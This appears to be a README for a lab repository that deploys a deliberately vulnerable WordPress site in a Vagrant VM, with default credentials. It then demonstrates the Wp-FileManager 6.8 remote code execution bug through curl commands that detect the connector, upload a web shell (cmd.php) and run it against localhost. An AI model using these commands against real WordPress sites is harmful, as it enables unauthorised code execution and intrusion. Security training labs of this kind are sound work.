# WordpressVuln



A vulnerable wordpress site


# Install 

The vulnerable wordpress server run in a virtual machine on an ubuntu host 
The server is build in an alpine with nginx/php-fpm and mariadb.



## Install vagrant 

```sudo apt install vagrant```


## Clone the repo and customize the site url 

```git clone https://github.com/jossets/WordpressVuln
```



## Start server 

```vagrant up
```

## Credentials 

Vagrant alpine box credentials are:
- login: vagrant 
- password: vagrant 


# Exploit 

WordPress Plugin Wp-FileManager 6.8 - RCE 
https://www.exploit-db.com/exploits/49178

## Detect 
```curl  "http://localhost:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"

{"error":["errUnknownCmd"]}
```

## Exploit

### Upload cmd.php
```curl -F "cmd=upload" -F "target=l1_Lw"  -F "upload[]=@cmd.php" "http://localhost:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
```

### Run it
```curl  "http://localhost:8080/wp-content/plugins/wp-file-manager/lib/files/cmd.php"

Pwnd
```